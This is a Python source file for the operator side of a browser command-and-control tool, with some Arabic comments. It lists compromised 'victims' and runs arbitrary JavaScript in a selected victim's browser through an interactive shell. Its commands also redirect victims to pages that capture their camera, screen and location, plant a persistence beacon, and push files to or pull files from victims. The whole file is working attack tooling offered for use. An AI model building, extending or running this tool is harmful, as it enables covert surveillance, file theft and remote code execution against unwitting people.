import cmd
import requests
import json
import os
from datetime import datetime, timedelta
from colorama import Fore, init, Style
import readline
import webbrowser

init(autoreset=True)

ONLINE_TIMEOUT = 60  # ثانية

class JSShell(cmd.Cmd):
    prompt = f"{Fore.YELLOW}JS> {Style.RESET_ALL}"

    def __init__(self, c2cli, victim_id):
        super().__init__()
        self.c2cli = c2cli
        self.victim_id = victim_id
        self.buffer = []
        self.multiline = False

    def default(self, line):
        if line.strip().endswith('"""'):
            if self.multiline:
                self.buffer.append(line[:-3].strip())
                js_code = '\n'.join(self.buffer)
                self._execute_js(js_code)
                self.buffer = []
                self.multiline = False
                self.prompt = f"{Fore.YELLOW}JS> {Style.RESET_ALL}"
            else:
                self.multiline = True
                self.prompt = f"{Fore.YELLOW}... {Style.RESET_ALL}"
        elif self.multiline:
            self.buffer.append(line)
        else:
            cleaned_line = line.strip()
            if not cleaned_line.endswith(';') and not any(x in cleaned_line for x in ['{', '}', 'function']):
                line += ';'
            self._execute_js(line)

    def _execute_js(self, code):
        try:
            response = requests.post(
                f"{self.c2cli.server_url}/api/execute",
                json={
                    'victim_id': self.victim_id,
                    'command': code,
                    'source': 'shell'
                },
                timeout=5
            )

            if response.status_code == 200:
                print(f"{Fore.GREEN}✓ Command executed on victim's browser{Style.RESET_ALL}")
                try:
                    result = response.json()
                    if 'result' in result:
                        print(f"{Fore.CYAN}↳ {result['result']}{Style.RESET_ALL}")
                except:
                    pass
            else:
                print(f"{Fore.RED}✗ Server returned status: {response.status_code}{Style.RESET_ALL}")

        except Exception as e:
            print(f"{Fore.RED}✗ Connection error: {str(e)}{Style.RESET_ALL}")

    def do_exit(self, arg):
        """Exit the JS shell"""
        if self.multiline:
            print(f"{Fore.RED}✗ Finish multiline input first (use \"\"\"){Style.RESET_ALL}")
            return False
        return True

    def do_clear(self, arg):
        """Clear the screen"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def postcmd(self, stop, line):
        if not self.multiline:
            print()
        return stop


class C2CLI(cmd.Cmd):
    prompt = f"{Fore.CYAN}C2>{Style.RESET_ALL} "

    def __init__(self):
        super().__init__()
        self.server_url = "http://localhost:5000"
        self.selected_victim = None
        self.command_history = []
        self.last_victims_list = []  # قائمة الضحايا الأخيرة

    def _time_ago(self, last_seen):
        if not last_seen:
            return "Never"
        try:
            last_seen_dt = datetime.fromisoformat(last_seen)
        except ValueError:
            try:
                last_seen_dt = datetime.strptime(last_seen, "%Y-%m-%d %H:%M:%S")
            except:
                return str(last_seen)

        diff = datetime.utcnow() - last_seen_dt
        seconds = int(diff.total_seconds())

        intervals = (
            ('d', 86400),
            ('h', 3600),
            ('m', 60),
            ('s', 1)
        )

        for unit, div in intervals:
            if seconds >= div:
                return f"{seconds // div}{unit} ago"
        return "Just now"

    def _get_status(self, last_seen):
        """حساب حالة الضحية بناءً على last_seen"""
        if not last_seen:
            return "Offline"
        try:
            last_seen_dt = datetime.fromisoformat(last_seen)
        except ValueError:
            return "Offline"
        if datetime.utcnow() - last_seen_dt <= timedelta(seconds=ONLINE_TIMEOUT):
            return "Online"
        return "Offline"

    def do_list(self, arg):
        """List connected victims"""
        try:
            response = requests.get(f"{self.server_url}/api/victims")
            response.raise_for_status()
            victims = response.json()
            self.last_victims_list = victims
        except Exception as e:
            print(f"{Fore.RED}✗ Failed to fetch victims: {e}{Style.RESET_ALL}")
            return

        print(f"\n{Fore.YELLOW}{'No.':<5}{'ID':<36}{'Status':<10}{'Last Seen':<20}{Style.RESET_ALL}")
        print(f"{'-'*75}")
        for idx, v in enumerate(victims, 1):
            status = self._get_status(v.get('last_seen', ''))
            status_colored = f"{Fore.GREEN}Online" if status == "Online" else f"{Fore.RED}Offline"
            last_seen_str = v['last_seen'] if v['last_seen'] else "Never"
            print(f"{Fore.CYAN}{idx:<5}{v['id']:<36}{status_colored:<10}{Fore.MAGENTA}{last_seen_str}{Style.RESET_ALL}")
        print("")

    def do_select(self, arg):
        """Select victim by number from the last list command"""
        if not self.last_victims_list:
            print(f"{Fore.RED}✗ No victims list found. Run 'list' first.{Style.RESET_ALL}")
            return

        try:
            idx = int(arg)
            if idx < 1 or idx > len(self.last_victims_list):
                print(f"{Fore.RED}✗ Invalid selection number{Style.RESET_ALL}")
                return
        except ValueError:
            print(f"{Fore.RED}✗ Please provide a valid number{Style.RESET_ALL}")
            return

        victim = self.last_victims_list[idx - 1]
        self.selected_victim = victim['id']
        print(f"{Fore.GREEN}✓ Selected victim #{idx}: {self.selected_victim}{Style.RESET_ALL}")
        self.do_info('')

    def do_shell(self, arg):
        """Open interactive JavaScript shell"""
        if not self.selected_victim:
            print(f"{Fore.RED}✗ Select victim first{Style.RESET_ALL}")
            return

        print(f"\n{Fore.CYAN}=== JS Shell ({self.selected_victim}) ==={Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Tip:{Style.RESET_ALL} Use \"\"\" for multi-line input")
        print(f"{Fore.YELLOW}Type 'exit' to return\n{Style.RESET_ALL}")

        JSShell(self, self.selected_victim).cmdloop()

    def do_info(self, arg):
        """Show victim details"""
        if not self.selected_victim:
            print(f"{Fore.RED}✗ No victim selected{Style.RESET_ALL}")
            return

        try:
            response = requests.get(f"{self.server_url}/api/victims")
            response.raise_for_status()
            victims = response.json()
        except Exception as e:
            print(f"{Fore.RED}✗ Failed to fetch victims: {e}{Style.RESET_ALL}")
            return

        victim = next((v for v in victims if v['id'] == self.selected_victim), None)
        if victim:
            status = self._get_status(victim.get('last_seen', ''))
            status_colored = f"{Fore.GREEN}Online" if status == "Online" else f"{Fore.RED}Offline"
            print(f"\n{Fore.CYAN}=== Victim Info ==={Style.RESET_ALL}")
            print(f"ID: {victim['id']}")
            print(f"Status: {status_colored}{Style.RESET_ALL}")
            print(f"Last Seen: {victim['last_seen']}")
        else:
            print(f"{Fore.RED}✗ Victim not found{Style.RESET_ALL}")

    def do_geo(self, arg):
        """Get victim location"""
        self._execute_service('geo')

    def do_camera(self, arg):
        """Capture victim camera"""
        self._execute_service('camera')

    def do_screenshare(self, arg):
        """Capture victim screen"""
        self._execute_service('screenshare')

    def do_cmd(self, js_code):
        """Execute custom JS command"""
        if not self.selected_victim:
            print(f"{Fore.RED}✗ No victim selected{Style.RESET_ALL}")
            return

        if not js_code:
            print(f"{Fore.RED}✗ Please provide JS code{Style.RESET_ALL}")
            return

        response = requests.post(
            f"{self.server_url}/api/execute",
            json={
                'victim_id': self.selected_victim,
                'command': js_code,
                'source': 'cmd'
            }
        )
        print(response.json())

    def do_persist(self, arg):
        """Establish persistence on victim"""
        if not self.selected_victim:
            print(f"{Fore.RED}✗ No victim selected{Style.RESET_ALL}")
            return

        js_code = """
        if (!window.persistInterval) {
            window.persistInterval = setInterval(() => {
                if (!window.c2Connected) {
                    fetch('/').then(() => {
                        window.c2Connected = true;
                    }).catch(() => {
                        window.c2Connected = false;
                    });
                }
            }, 60000);
        }
        """
        self.do_cmd(js_code)

    def do_upload(self, arg):
        """Upload file to victim"""
        if not self.selected_victim:
            print(f"{Fore.RED}✗ No victim selected{Style.RESET_ALL}")
            return

        if not os.path.exists(arg):
            print(f"{Fore.RED}✗ File not found{Style.RESET_ALL}")
            return

        with open(arg, 'rb') as f:
            response = requests.post(
                f"{self.server_url}/api/upload",
                files={'file': f},
                data={'victim_id': self.selected_victim}
            )
        print(response.json())

    def do_download(self, arg):
        """Download file from victim"""
        if not self.selected_victim:
            print(f"{Fore.RED}✗ No victim selected{Style.RESET_ALL}")
            return

        response = requests.get(
            f"{self.server_url}/api/download",
            params={'victim_id': self.selected_victim, 'filename': arg}
        )

        os.makedirs('downloads', exist_ok=True)
        with open(f"downloads/{arg}", 'wb') as f:
            f.write(response.content)
        print(f"{Fore.GREEN}✓ File saved to downloads/{arg}{Style.RESET_ALL}")

    def do_history(self, arg):
        """Show command history"""
        for idx, cmd in enumerate(self.command_history[-10:], 1):
            print(f"{idx}. {cmd}")

    def do_clear(self, arg):
        """Clear the screen"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def do_exit(self, arg):
        """Exit the CLI"""
        print(f"{Fore.YELLOW}Exiting...{Style.RESET_ALL}")
        return True

    def _execute_service(self, service):
        if not self.selected_victim:
            print(f"{Fore.RED}✗ No victim selected{Style.RESET_ALL}")
            return

        link = f"{self.server_url}/{service}.html?victim={self.selected_victim}"
        try:
            response = requests.post(
                f"{self.server_url}/api/execute",
                json={
                    'victim_id': self.selected_victim,
                    'command': f"window.location.href='{link}'",
                    'source': 'service'
                }
            )
            if response.status_code == 200:
                print(f"{Fore.GREEN}✓ Command sent successfully{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}✗ Failed to send command{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}✗ Error: {str(e)}{Style.RESET_ALL}")

        print(f"{Fore.YELLOW}[➤] Direct link: {link}{Style.RESET_ALL}")
        try:
            webbrowser.open(link)
        except:
            pass

    def preloop(self):
        print(f"{Fore.CYAN}Advanced C2 CLI - Type 'help' for commands{Style.RESET_ALL}")

    def precmd(self, line):
        self.command_history.append(line)
        return line


if __name__ == '__main__':
    C2CLI().cmdloop()
